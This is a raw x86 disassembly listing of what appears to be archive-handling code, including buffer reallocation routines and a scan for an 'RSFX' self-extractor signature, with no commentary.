  401706:	cc                   	int3
  401707:	cc                   	int3
  401708:	cc                   	int3
  401709:	cc                   	int3
  40170a:	cc                   	int3
  40170b:	cc                   	int3
  40170c:	cc                   	int3
  40170d:	cc                   	int3
  40170e:	cc                   	int3
  40170f:	cc                   	int3
  401710:	56                   	push   %esi
  401711:	8b f1                	mov    %ecx,%esi
  401713:	e8 7a ff ff ff       	call   0x401692
  401718:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40171d:	74 0d                	je     0x40172c
  40171f:	68 18 7d 00 00       	push   $0x7d18
  401724:	56                   	push   %esi
  401725:	e8 3e d4 01 00       	call   0x41eb68
  40172a:	59                   	pop    %ecx
  40172b:	59                   	pop    %ecx
  40172c:	8b c6                	mov    %esi,%eax
  40172e:	5e                   	pop    %esi
  40172f:	c2 04 00             	ret    $0x4
  401732:	56                   	push   %esi
  401733:	8b f1                	mov    %ecx,%esi
  401735:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401739:	03 4e 04             	add    0x4(%esi),%ecx
  40173c:	89 4e 04             	mov    %ecx,0x4(%esi)
  40173f:	3b 4e 08             	cmp    0x8(%esi),%ecx
  401742:	0f 86 9d 00 00 00    	jbe    0x4017e5
  401748:	8b 46 0c             	mov    0xc(%esi),%eax
  40174b:	53                   	push   %ebx
  40174c:	55                   	push   %ebp
  40174d:	bd 98 10 44 00       	mov    $0x441098,%ebp
  401752:	57                   	push   %edi
  401753:	85 c0                	test   %eax,%eax
  401755:	74 1a                	je     0x401771
  401757:	3b c8                	cmp    %eax,%ecx
  401759:	76 16                	jbe    0x401771
  40175b:	50                   	push   %eax
  40175c:	68 18 36 43 00       	push   $0x433618
  401761:	55                   	push   %ebp
  401762:	e8 cf 54 00 00       	call   0x406c36
  401767:	83 c4 0c             	add    $0xc,%esp
  40176a:	8b cd                	mov    %ebp,%ecx
  40176c:	e8 36 55 00 00       	call   0x406ca7
  401771:	8b 46 08             	mov    0x8(%esi),%eax
  401774:	8b 5e 04             	mov    0x4(%esi),%ebx
  401777:	c1 e8 02             	shr    $0x2,%eax
  40177a:	83 c0 20             	add    $0x20,%eax
  40177d:	03 46 08             	add    0x8(%esi),%eax
  401780:	3b d8                	cmp    %eax,%ebx
  401782:	77 02                	ja     0x401786
  401784:	8b d8                	mov    %eax,%ebx
  401786:	80 7e 10 00          	cmpb   $0x0,0x10(%esi)
  40178a:	53                   	push   %ebx
  40178b:	74 3a                	je     0x4017c7
  40178d:	e8 a1 26 02 00       	call   0x423e33
  401792:	8b f8                	mov    %eax,%edi
  401794:	59                   	pop    %ecx
  401795:	85 ff                	test   %edi,%edi
  401797:	75 07                	jne    0x4017a0
  401799:	8b cd                	mov    %ebp,%ecx
  40179b:	e8 07 55 00 00       	call   0x406ca7
  4017a0:	83 3e 00             	cmpl   $0x0,(%esi)
  4017a3:	74 38                	je     0x4017dd
  4017a5:	ff 76 08             	push   0x8(%esi)
  4017a8:	ff 36                	push   (%esi)
  4017aa:	57                   	push   %edi
  4017ab:	e8 70 eb 01 00       	call   0x420320
  4017b0:	83 c4 0c             	add    $0xc,%esp
  4017b3:	ff 76 08             	push   0x8(%esi)
  4017b6:	ff 36                	push   (%esi)
  4017b8:	e8 88 dc 00 00       	call   0x40f445
  4017bd:	ff 36                	push   (%esi)
  4017bf:	e8 6a 26 02 00       	call   0x423e2e
  4017c4:	59                   	pop    %ecx
  4017c5:	eb 16                	jmp    0x4017dd
  4017c7:	ff 36                	push   (%esi)
  4017c9:	e8 70 26 02 00       	call   0x423e3e
  4017ce:	8b f8                	mov    %eax,%edi
  4017d0:	59                   	pop    %ecx
  4017d1:	59                   	pop    %ecx
  4017d2:	85 ff                	test   %edi,%edi
  4017d4:	75 07                	jne    0x4017dd
  4017d6:	8b cd                	mov    %ebp,%ecx
  4017d8:	e8 ca 54 00 00       	call   0x406ca7
  4017dd:	89 3e                	mov    %edi,(%esi)
  4017df:	5f                   	pop    %edi
  4017e0:	5d                   	pop    %ebp
  4017e1:	89 5e 08             	mov    %ebx,0x8(%esi)
  4017e4:	5b                   	pop    %ebx
  4017e5:	5e                   	pop    %esi
  4017e6:	c2 04 00             	ret    $0x4
  4017e9:	56                   	push   %esi
  4017ea:	8b f1                	mov    %ecx,%esi
  4017ec:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4017f0:	03 4e 04             	add    0x4(%esi),%ecx
  4017f3:	89 4e 04             	mov    %ecx,0x4(%esi)
  4017f6:	3b 4e 08             	cmp    0x8(%esi),%ecx
  4017f9:	0f 86 a6 00 00 00    	jbe    0x4018a5
  4017ff:	8b 46 0c             	mov    0xc(%esi),%eax
  401802:	53                   	push   %ebx
  401803:	55                   	push   %ebp
  401804:	bd 98 10 44 00       	mov    $0x441098,%ebp
  401809:	57                   	push   %edi
  40180a:	85 c0                	test   %eax,%eax
  40180c:	74 1a                	je     0x401828
  40180e:	3b c8                	cmp    %eax,%ecx
  401810:	76 16                	jbe    0x401828
  401812:	50                   	push   %eax
  401813:	68 18 36 43 00       	push   $0x433618
  401818:	55                   	push   %ebp
  401819:	e8 18 54 00 00       	call   0x406c36
  40181e:	83 c4 0c             	add    $0xc,%esp
  401821:	8b cd                	mov    %ebp,%ecx
  401823:	e8 7f 54 00 00       	call   0x406ca7
  401828:	8b 46 08             	mov    0x8(%esi),%eax
  40182b:	8b 5e 04             	mov    0x4(%esi),%ebx
  40182e:	c1 e8 02             	shr    $0x2,%eax
  401831:	83 c0 20             	add    $0x20,%eax
  401834:	03 46 08             	add    0x8(%esi),%eax
  401837:	3b d8                	cmp    %eax,%ebx
  401839:	77 02                	ja     0x40183d
  40183b:	8b d8                	mov    %eax,%ebx
  40183d:	80 7e 10 00          	cmpb   $0x0,0x10(%esi)
  401841:	8d 04 1b             	lea    (%ebx,%ebx,1),%eax
  401844:	50                   	push   %eax
  401845:	74 40                	je     0x401887
  401847:	e8 e7 25 02 00       	call   0x423e33
  40184c:	8b f8                	mov    %eax,%edi
  40184e:	59                   	pop    %ecx
  40184f:	85 ff                	test   %edi,%edi
  401851:	75 07                	jne    0x40185a
  401853:	8b cd                	mov    %ebp,%ecx
  401855:	e8 4d 54 00 00       	call   0x406ca7
  40185a:	83 3e 00             	cmpl   $0x0,(%esi)
  40185d:	74 3e                	je     0x40189d
  40185f:	8b 46 08             	mov    0x8(%esi),%eax
  401862:	03 c0                	add    %eax,%eax
  401864:	50                   	push   %eax
  401865:	ff 36                	push   (%esi)
  401867:	57                   	push   %edi
  401868:	e8 b3 ea 01 00       	call   0x420320
  40186d:	8b 46 08             	mov    0x8(%esi),%eax
  401870:	83 c4 0c             	add    $0xc,%esp
  401873:	03 c0                	add    %eax,%eax
  401875:	50                   	push   %eax
  401876:	ff 36                	push   (%esi)
  401878:	e8 c8 db 00 00       	call   0x40f445
  40187d:	ff 36                	push   (%esi)
  40187f:	e8 aa 25 02 00       	call   0x423e2e
  401884:	59                   	pop    %ecx
  401885:	eb 16                	jmp    0x40189d
  401887:	ff 36                	push   (%esi)
  401889:	e8 b0 25 02 00       	call   0x423e3e
  40188e:	8b f8                	mov    %eax,%edi
  401890:	59                   	pop    %ecx
  401891:	59                   	pop    %ecx
  401892:	85 ff                	test   %edi,%edi
  401894:	75 07                	jne    0x40189d
  401896:	8b cd                	mov    %ebp,%ecx
  401898:	e8 0a 54 00 00       	call   0x406ca7
  40189d:	89 3e                	mov    %edi,(%esi)
  40189f:	5f                   	pop    %edi
  4018a0:	5d                   	pop    %ebp
  4018a1:	89 5e 08             	mov    %ebx,0x8(%esi)
  4018a4:	5b                   	pop    %ebx
  4018a5:	5e                   	pop    %esi
  4018a6:	c2 04 00             	ret    $0x4
  4018a9:	8b 44 24 04          	mov    0x4(%esp),%eax
  4018ad:	3b 41 08             	cmp    0x8(%ecx),%eax
  4018b0:	76 0b                	jbe    0x4018bd
  4018b2:	2b 41 04             	sub    0x4(%ecx),%eax
  4018b5:	50                   	push   %eax
  4018b6:	e8 2e ff ff ff       	call   0x4017e9
  4018bb:	eb 03                	jmp    0x4018c0
  4018bd:	89 41 04             	mov    %eax,0x4(%ecx)
  4018c0:	c2 04 00             	ret    $0x4
  4018c3:	56                   	push   %esi
  4018c4:	ff 74 24 08          	push   0x8(%esp)
  4018c8:	8b f1                	mov    %ecx,%esi
  4018ca:	e8 35 01 00 00       	call   0x401a04
  4018cf:	84 c0                	test   %al,%al
  4018d1:	75 1f                	jne    0x4018f2
  4018d3:	38 86 dd 6c 00 00    	cmp    %al,0x6cdd(%esi)
  4018d9:	75 0b                	jne    0x4018e6
  4018db:	8d 46 32             	lea    0x32(%esi),%eax
  4018de:	50                   	push   %eax
  4018df:	6a 39                	push   $0x39
  4018e1:	e8 a5 fa ff ff       	call   0x40138b
  4018e6:	6a 02                	push   $0x2
  4018e8:	b9 98 10 44 00       	mov    $0x441098,%ecx
  4018ed:	e8 3f 53 00 00       	call   0x406c31
  4018f2:	5e                   	pop    %esi
  4018f3:	c2 04 00             	ret    $0x4
  4018f6:	53                   	push   %ebx
  4018f7:	56                   	push   %esi
  4018f8:	8b f1                	mov    %ecx,%esi
  4018fa:	33 db                	xor    %ebx,%ebx
  4018fc:	57                   	push   %edi
  4018fd:	53                   	push   %ebx
  4018fe:	8b 3e                	mov    (%esi),%edi
  401900:	38 9e 3c 22 00 00    	cmp    %bl,0x223c(%esi)
  401906:	74 3d                	je     0x401945
  401908:	8b 86 d8 6c 00 00    	mov    0x6cd8(%esi),%eax
  40190e:	8b 4f 10             	mov    0x10(%edi),%ecx
  401911:	83 c0 14             	add    $0x14,%eax
  401914:	53                   	push   %ebx
  401915:	50                   	push   %eax
  401916:	ff 15 78 32 43 00    	call   *0x433278
  40191c:	8b ce                	mov    %esi,%ecx
  40191e:	ff 57 10             	call   *0x10(%edi)
  401921:	8b ce                	mov    %esi,%ecx
  401923:	e8 05 22 00 00       	call   0x403b2d
  401928:	85 c0                	test   %eax,%eax
  40192a:	74 15                	je     0x401941
  40192c:	83 be f4 21 00 00 75 	cmpl   $0x75,0x21f4(%esi)
  401933:	75 0c                	jne    0x401941
  401935:	8b 44 24 10          	mov    0x10(%esp),%eax
  401939:	39 58 04             	cmp    %ebx,0x4(%eax)
  40193c:	0f 97 c0             	seta   %al
  40193f:	eb 3c                	jmp    0x40197d
  401941:	32 c0                	xor    %al,%al
  401943:	eb 38                	jmp    0x40197d
  401945:	e8 85 08 00 00       	call   0x4021cf
  40194a:	8b 4f 10             	mov    0x10(%edi),%ecx
  40194d:	52                   	push   %edx
  40194e:	50                   	push   %eax
  40194f:	ff 15 78 32 43 00    	call   *0x433278
  401955:	8b ce                	mov    %esi,%ecx
  401957:	ff 57 10             	call   *0x10(%edi)
  40195a:	68 70 36 43 00       	push   $0x433670
  40195f:	8b ce                	mov    %esi,%ecx
  401961:	e8 3d 26 00 00       	call   0x403fa3
  401966:	85 c0                	test   %eax,%eax
  401968:	74 11                	je     0x40197b
  40196a:	ff 74 24 10          	push   0x10(%esp)
  40196e:	8b ce                	mov    %esi,%ecx
  401970:	e8 db 04 00 00       	call   0x401e50
  401975:	84 c0                	test   %al,%al
  401977:	74 02                	je     0x40197b
  401979:	b3 01                	mov    $0x1,%bl
  40197b:	8a c3                	mov    %bl,%al
  40197d:	5f                   	pop    %edi
  40197e:	5e                   	pop    %esi
  40197f:	5b                   	pop    %ebx
  401980:	c2 04 00             	ret    $0x4
  401983:	80 b9 d4 6c 00 00 00 	cmpb   $0x0,0x6cd4(%ecx)
  40198a:	8b 54 24 04          	mov    0x4(%esp),%edx
  40198e:	74 1a                	je     0x4019aa
  401990:	8b c2                	mov    %edx,%eax
  401992:	f7 d8                	neg    %eax
  401994:	83 e0 0f             	and    $0xf,%eax
  401997:	03 d0                	add    %eax,%edx
  401999:	83 b9 c8 6c 00 00 03 	cmpl   $0x3,0x6cc8(%ecx)
  4019a0:	75 05                	jne    0x4019a7
  4019a2:	83 c2 10             	add    $0x10,%edx
  4019a5:	eb 03                	jmp    0x4019aa
  4019a7:	83 c2 08             	add    $0x8,%edx
  4019aa:	8b c2                	mov    %edx,%eax
  4019ac:	c2 04 00             	ret    $0x4
  4019af:	55                   	push   %ebp
  4019b0:	8b e9                	mov    %ecx,%ebp
  4019b2:	80 bd ce 6c 00 00 00 	cmpb   $0x0,0x6cce(%ebp)
  4019b9:	75 04                	jne    0x4019bf
  4019bb:	32 c0                	xor    %al,%al
  4019bd:	eb 41                	jmp    0x401a00
  4019bf:	8b 45 00             	mov    0x0(%ebp),%eax
  4019c2:	53                   	push   %ebx
  4019c3:	56                   	push   %esi
  4019c4:	57                   	push   %edi
  4019c5:	8b 70 14             	mov    0x14(%eax),%esi
  4019c8:	8b ce                	mov    %esi,%ecx
  4019ca:	ff 15 78 32 43 00    	call   *0x433278
  4019d0:	8b cd                	mov    %ebp,%ecx
  4019d2:	ff d6                	call   *%esi
  4019d4:	ff 74 24 14          	push   0x14(%esp)
  4019d8:	8b cd                	mov    %ebp,%ecx
  4019da:	8b f8                	mov    %eax,%edi
  4019dc:	8b f2                	mov    %edx,%esi
  4019de:	e8 13 ff ff ff       	call   0x4018f6
  4019e3:	8b 4d 00             	mov    0x0(%ebp),%ecx
  4019e6:	8a d8                	mov    %al,%bl
  4019e8:	6a 00                	push   $0x0
  4019ea:	56                   	push   %esi
  4019eb:	57                   	push   %edi
  4019ec:	8b 71 10             	mov    0x10(%ecx),%esi
  4019ef:	8b ce                	mov    %esi,%ecx
  4019f1:	ff 15 78 32 43 00    	call   *0x433278
  4019f7:	8b cd                	mov    %ebp,%ecx
  4019f9:	ff d6                	call   *%esi
  4019fb:	5f                   	pop    %edi
  4019fc:	5e                   	pop    %esi
  4019fd:	8a c3                	mov    %bl,%al
  4019ff:	5b                   	pop    %ebx
  401a00:	5d                   	pop    %ebp
  401a01:	c2 04 00             	ret    $0x4
  401a04:	b8 5a 26 43 00       	mov    $0x43265a,%eax
  401a09:	e8 6a d1 01 00       	call   0x41eb78
  401a0e:	83 ec 2c             	sub    $0x2c,%esp
  401a11:	53                   	push   %ebx
  401a12:	56                   	push   %esi
  401a13:	8b d9                	mov    %ecx,%ebx
  401a15:	57                   	push   %edi
  401a16:	6a 07                	push   $0x7
  401a18:	5f                   	pop    %edi
  401a19:	8b 03                	mov    (%ebx),%eax
  401a1b:	8d 8b 10 22 00 00    	lea    0x2210(%ebx),%ecx
  401a21:	57                   	push   %edi
  401a22:	51                   	push   %ecx
  401a23:	c6 83 d4 6c 00 00 00 	movb   $0x0,0x6cd4(%ebx)
  401a2a:	8b 70 0c             	mov    0xc(%eax),%esi
  401a2d:	8b ce                	mov    %esi,%ecx
  401a2f:	c6 83 dc 6c 00 00 00 	movb   $0x0,0x6cdc(%ebx)
  401a36:	ff 15 78 32 43 00    	call   *0x433278
  401a3c:	8b cb                	mov    %ebx,%ecx
  401a3e:	ff d6                	call   *%esi
  401a40:	3b c7                	cmp    %edi,%eax
  401a42:	0f 85 58 01 00 00    	jne    0x401ba0
  401a48:	57                   	push   %edi
  401a49:	8d 83 10 22 00 00    	lea    0x2210(%ebx),%eax
  401a4f:	33 f6                	xor    %esi,%esi
  401a51:	50                   	push   %eax
  401a52:	89 b3 d8 6c 00 00    	mov    %esi,0x6cd8(%ebx)
  401a58:	e8 9b 03 00 00       	call   0x401df8
  401a5d:	85 c0                	test   %eax,%eax
  401a5f:	74 3f                	je     0x401aa0
  401a61:	89 83 c8 6c 00 00    	mov    %eax,0x6cc8(%ebx)
  401a67:	83 f8 01             	cmp    $0x1,%eax
  401a6a:	0f 85 4c 01 00 00    	jne    0x401bbc
  401a70:	8b 3b                	mov    (%ebx),%edi
  401a72:	56                   	push   %esi
  401a73:	8b 77 14             	mov    0x14(%edi),%esi
  401a76:	8b ce                	mov    %esi,%ecx
  401a78:	ff 15 78 32 43 00    	call   *0x433278
  401a7e:	8b cb                	mov    %ebx,%ecx
  401a80:	ff d6                	call   *%esi
  401a82:	8b 4f 10             	mov    0x10(%edi),%ecx
  401a85:	83 e8 07             	sub    $0x7,%eax
  401a88:	83 da 00             	sbb    $0x0,%edx
  401a8b:	52                   	push   %edx
  401a8c:	50                   	push   %eax
  401a8d:	ff 15 78 32 43 00    	call   *0x433278
  401a93:	8b cb                	mov    %ebx,%ecx
  401a95:	ff 57 10             	call   *0x10(%edi)
  401a98:	6a 07                	push   $0x7
  401a9a:	5f                   	pop    %edi
  401a9b:	e9 1c 01 00 00       	jmp    0x401bbc
  401aa0:	68 00 00 20 00       	push   $0x200000
  401aa5:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401aa8:	e8 0d f9 ff ff       	call   0x4013ba
  401aad:	8b 03                	mov    (%ebx),%eax
  401aaf:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401ab2:	8b 70 14             	mov    0x14(%eax),%esi
  401ab5:	8b ce                	mov    %esi,%ecx
  401ab7:	ff 15 78 32 43 00    	call   *0x433278
  401abd:	8b cb                	mov    %ebx,%ecx
  401abf:	ff d6                	call   *%esi
  401ac1:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401ac4:	8b 33                	mov    (%ebx),%esi
  401ac6:	83 c1 f0             	add    $0xfffffff0,%ecx
  401ac9:	51                   	push   %ecx
  401aca:	ff 75 c8             	push   -0x38(%ebp)
  401acd:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401ad0:	8b 4e 0c             	mov    0xc(%esi),%ecx
  401ad3:	ff 15 78 32 43 00    	call   *0x433278
  401ad9:	8b cb                	mov    %ebx,%ecx
  401adb:	ff 56 0c             	call   *0xc(%esi)
  401ade:	8b c8                	mov    %eax,%ecx
  401ae0:	33 f6                	xor    %esi,%esi
  401ae2:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  401ae5:	85 c9                	test   %ecx,%ecx
  401ae7:	0f 8e a2 00 00 00    	jle    0x401b8f
  401aed:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  401af0:	03 ce                	add    %esi,%ecx
  401af2:	80 39 52             	cmpb   $0x52,(%ecx)
  401af5:	75 4a                	jne    0x401b41
  401af7:	2b c6                	sub    %esi,%eax
  401af9:	50                   	push   %eax
  401afa:	51                   	push   %ecx
  401afb:	e8 f8 02 00 00       	call   0x401df8
  401b00:	85 c0                	test   %eax,%eax
  401b02:	74 3a                	je     0x401b3e
  401b04:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401b07:	89 83 c8 6c 00 00    	mov    %eax,0x6cc8(%ebx)
  401b0d:	83 f8 01             	cmp    $0x1,%eax
  401b10:	75 36                	jne    0x401b48
  401b12:	85 f6                	test   %esi,%esi
  401b14:	7e 32                	jle    0x401b48
  401b16:	83 f9 1c             	cmp    $0x1c,%ecx
  401b19:	7d 2d                	jge    0x401b48
  401b1b:	83 7d ec 1f          	cmpl   $0x1f,-0x14(%ebp)
  401b1f:	7e 27                	jle    0x401b48
  401b21:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401b24:	2b c1                	sub    %ecx,%eax
  401b26:	80 78 1c 52          	cmpb   $0x52,0x1c(%eax)
  401b2a:	75 12                	jne    0x401b3e
  401b2c:	80 78 1d 53          	cmpb   $0x53,0x1d(%eax)
  401b30:	75 0c                	jne    0x401b3e
  401b32:	80 78 1e 46          	cmpb   $0x46,0x1e(%eax)
  401b36:	75 06                	jne    0x401b3e
  401b38:	80 78 1f 58          	cmpb   $0x58,0x1f(%eax)
  401b3c:	74 0a                	je     0x401b48
  401b3e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401b41:	46                   	inc    %esi
  401b42:	3b f0                	cmp    %eax,%esi
  401b44:	7c a7                	jl     0x401aed
  401b46:	eb 47                	jmp    0x401b8f
  401b48:	8b 03                	mov    (%ebx),%eax
  401b4a:	03 ce                	add    %esi,%ecx
  401b4c:	6a 00                	push   $0x0
  401b4e:	6a 00                	push   $0x0
  401b50:	89 8b d8 6c 00 00    	mov    %ecx,0x6cd8(%ebx)
  401b56:	8b 70 10             	mov    0x10(%eax),%esi
  401b59:	51                   	push   %ecx
  401b5a:	8b ce                	mov    %esi,%ecx
  401b5c:	ff 15 78 32 43 00    	call   *0x433278
  401b62:	8b cb                	mov    %ebx,%ecx
  401b64:	ff d6                	call   *%esi
  401b66:	8b 83 c8 6c 00 00    	mov    0x6cc8(%ebx),%eax
  401b6c:	83 f8 02             	cmp    $0x2,%eax
  401b6f:	74 05                	je     0x401b76
  401b71:	83 f8 03             	cmp    $0x3,%eax
  401b74:	75 19                	jne    0x401b8f
  401b76:	8b 03                	mov    (%ebx),%eax
  401b78:	8d 8b 10 22 00 00    	lea    0x2210(%ebx),%ecx
  401b7e:	57                   	push   %edi
  401b7f:	51                   	push   %ecx
  401b80:	8b 70 0c             	mov    0xc(%eax),%esi
  401b83:	8b ce                	mov    %esi,%ecx
  401b85:	ff 15 78 32 43 00    	call   *0x433278
  401b8b:	8b cb                	mov    %ebx,%ecx
  401b8d:	ff d6                	call   *%esi
  401b8f:	83 bb d8 6c 00 00 00 	cmpl   $0x0,0x6cd8(%ebx)
  401b96:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401b99:	75 18                	jne    0x401bb3
  401b9b:	e8 5b fa ff ff       	call   0x4015fb
  401ba0:	32 c0                	xor    %al,%al
  401ba2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401ba5:	5f                   	pop    %edi
  401ba6:	5e                   	pop    %esi
  401ba7:	5b                   	pop    %ebx
  401ba8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401baf:	c9                   	leave
  401bb0:	c2 04 00             	ret    $0x4
  401bb3:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  401bb7:	e8 3f fa ff ff       	call   0x4015fb
  401bbc:	8b 83 c8 6c 00 00    	mov    0x6cc8(%ebx),%eax
  401bc2:	83 f8 04             	cmp    $0x4,%eax
  401bc5:	75 0d                	jne    0x401bd4
  401bc7:	8d 43 32             	lea    0x32(%ebx),%eax
  401bca:	50                   	push   %eax
  401bcb:	6a 3c                	push   $0x3c
  401bcd:	e8 b9 f7 ff ff       	call   0x40138b
  401bd2:	eb cc                	jmp    0x401ba0
  401bd4:	83 f8 03             	cmp    $0x3,%eax
  401bd7:	75 27                	jne    0x401c00
  401bd9:	8b 03                	mov    (%ebx),%eax
  401bdb:	8d bb 17 22 00 00    	lea    0x2217(%ebx),%edi
  401be1:	6a 01                	push   $0x1
  401be3:	57                   	push   %edi
  401be4:	8b 70 0c             	mov    0xc(%eax),%esi
  401be7:	8b ce                	mov    %esi,%ecx
  401be9:	ff 15 78 32 43 00    	call   *0x433278
  401bef:	8b cb                	mov    %ebx,%ecx
  401bf1:	ff d6                	call   *%esi
  401bf3:	83 f8 01             	cmp    $0x1,%eax
  401bf6:	75 a8                	jne    0x401ba0
  401bf8:	80 3f 00             	cmpb   $0x0,(%edi)
  401bfb:	75 a3                	jne    0x401ba0
  401bfd:	6a 08                	push   $0x8
  401bff:	5f                   	pop    %edi
  401c00:	32 c0                	xor    %al,%al
  401c02:	89 bb 18 22 00 00    	mov    %edi,0x2218(%ebx)
  401c08:	8b cb                	mov    %ebx,%ecx
  401c0a:	88 45 f3             	mov    %al,-0xd(%ebp)
  401c0d:	e8 1b 1f 00 00       	call   0x403b2d
  401c12:	85 c0                	test   %eax,%eax
  401c14:	0f 95 45 f2          	setne  -0xe(%ebp)
  401c18:	85 c0                	test   %eax,%eax
  401c1a:	74 3e                	je     0x401c5a
  401c1c:	32 c0                	xor    %al,%al
  401c1e:	88 45 f3             	mov    %al,-0xd(%ebp)
  401c21:	8b cb                	mov    %ebx,%ecx
  401c23:	e8 1f 03 00 00       	call   0x401f47
  401c28:	8b 83 f4 21 00 00    	mov    0x21f4(%ebx),%eax
  401c2e:	83 f8 01             	cmp    $0x1,%eax
  401c31:	0f 84 da 00 00 00    	je     0x401d11
  401c37:	80 bb f8 21 00 00 00 	cmpb   $0x0,0x21f8(%ebx)
  401c3e:	74 09                	je     0x401c49
  401c40:	83 f8 04             	cmp    $0x4,%eax
  401c43:	0f 84 c8 00 00 00    	je     0x401d11
  401c49:	8b cb                	mov    %ebx,%ecx
  401c4b:	e8 dd 1e 00 00       	call   0x403b2d
  401c50:	85 c0                	test   %eax,%eax
  401c52:	0f 95 45 f2          	setne  -0xe(%ebp)
  401c56:	85 c0                	test   %eax,%eax
  401c58:	75 c7                	jne    0x401c21
  401c5a:	8a 45 f3             	mov    -0xd(%ebp),%al
  401c5d:	8a 8b dd 6c 00 00    	mov    0x6cdd(%ebx),%cl
  401c63:	84 c9                	test   %cl,%cl
  401c65:	74 0a                	je     0x401c71
  401c67:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  401c6b:	0f 84 2f ff ff ff    	je     0x401ba0
  401c71:	80 bb dc 6c 00 00 00 	cmpb   $0x0,0x6cdc(%ebx)
  401c78:	75 04                	jne    0x401c7e
  401c7a:	84 c0                	test   %al,%al
  401c7c:	75 19                	jne    0x401c97
  401c7e:	84 c9                	test   %cl,%cl
  401c80:	75 0b                	jne    0x401c8d
  401c82:	8d 43 32             	lea    0x32(%ebx),%eax
  401c85:	50                   	push   %eax
  401c86:	6a 1b                	push   $0x1b
  401c88:	e8 fe f6 ff ff       	call   0x40138b
  401c8d:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  401c91:	0f 84 09 ff ff ff    	je     0x401ba0
  401c97:	80 7d f2 00          	cmpb   $0x0,-0xe(%ebp)
  401c9b:	8a 83 3c 22 00 00    	mov    0x223c(%ebx),%al
  401ca1:	88 83 ce 6c 00 00    	mov    %al,0x6cce(%ebx)
  401ca7:	0f 84 14 01 00 00    	je     0x401dc1
  401cad:	80 bb f8 21 00 00 00 	cmpb   $0x0,0x21f8(%ebx)
  401cb4:	74 0d                	je     0x401cc3
  401cb6:	80 bb d4 6c 00 00 00 	cmpb   $0x0,0x6cd4(%ebx)
  401cbd:	0f 85 fe 00 00 00    	jne    0x401dc1
  401cc3:	83 7b 10 01          	cmpl   $0x1,0x10(%ebx)
  401cc7:	0f 84 f4 00 00 00    	je     0x401dc1
  401ccd:	8b 03                	mov    (%ebx),%eax
  401ccf:	8b 70 14             	mov    0x14(%eax),%esi
  401cd2:	8b ce                	mov    %esi,%ecx
  401cd4:	ff 15 78 32 43 00    	call   *0x433278
  401cda:	8b cb                	mov    %ebx,%ecx
  401cdc:	ff d6                	call   *%esi
  401cde:	8b f0                	mov    %eax,%esi
  401ce0:	8b fa                	mov    %edx,%edi
  401ce2:	8b 83 b8 6c 00 00    	mov    0x6cb8(%ebx),%eax
  401ce8:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401ceb:	8b 83 bc 6c 00 00    	mov    0x6cbc(%ebx),%eax
  401cf1:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401cf4:	8b 83 c0 6c 00 00    	mov    0x6cc0(%ebx),%eax
  401cfa:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401cfd:	8b 83 c4 6c 00 00    	mov    0x6cc4(%ebx),%eax
  401d03:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401d06:	8b 83 f4 21 00 00    	mov    0x21f4(%ebx),%eax
  401d0c:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401d0f:	eb 43                	jmp    0x401d54
  401d11:	b0 01                	mov    $0x1,%al
  401d13:	e9 45 ff ff ff       	jmp    0x401c5d
  401d18:	8b 83 f4 21 00 00    	mov    0x21f4(%ebx),%eax
  401d1e:	83 f8 03             	cmp    $0x3,%eax
  401d21:	75 20                	jne    0x401d43
  401d23:	80 bb cd 6c 00 00 00 	cmpb   $0x0,0x6ccd(%ebx)
  401d2a:	74 0d                	je     0x401d39
  401d2c:	80 bb 80 56 00 00 00 	cmpb   $0x0,0x5680(%ebx)
  401d33:	75 04                	jne    0x401d39
  401d35:	b0 01                	mov    $0x1,%al
  401d37:	eb 02                	jmp    0x401d3b
  401d39:	32 c0                	xor    %al,%al
  401d3b:	88 83 d1 6c 00 00    	mov    %al,0x6cd1(%ebx)
  401d41:	eb 0a                	jmp    0x401d4d
  401d43:	83 f8 02             	cmp    $0x2,%eax
  401d46:	74 19                	je     0x401d61
  401d48:	83 f8 05             	cmp    $0x5,%eax
  401d4b:	74 32                	je     0x401d7f
  401d4d:	8b cb                	mov    %ebx,%ecx
  401d4f:	e8 f3 01 00 00       	call   0x401f47
  401d54:	8b cb                	mov    %ebx,%ecx
  401d56:	e8 d2 1d 00 00       	call   0x403b2d
  401d5b:	85 c0                	test   %eax,%eax
  401d5d:	75 b9                	jne    0x401d18
  401d5f:	eb 1e                	jmp    0x401d7f
  401d61:	80 bb cd 6c 00 00 00 	cmpb   $0x0,0x6ccd(%ebx)
  401d68:	74 0d                	je     0x401d77
  401d6a:	80 bb 30 33 00 00 00 	cmpb   $0x0,0x3330(%ebx)
  401d71:	75 04                	jne    0x401d77
  401d73:	b0 01                	mov    $0x1,%al
  401d75:	eb 02                	jmp    0x401d79
  401d77:	32 c0                	xor    %al,%al
  401d79:	88 83 d1 6c 00 00    	mov    %al,0x6cd1(%ebx)
  401d7f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401d82:	89 83 b8 6c 00 00    	mov    %eax,0x6cb8(%ebx)
  401d88:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401d8b:	89 83 bc 6c 00 00    	mov    %eax,0x6cbc(%ebx)
  401d91:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401d94:	89 83 c0 6c 00 00    	mov    %eax,0x6cc0(%ebx)
  401d9a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401d9d:	89 83 c4 6c 00 00    	mov    %eax,0x6cc4(%ebx)
  401da3:	8b 45 dc             	mov    -0x24(%ebp),%eax
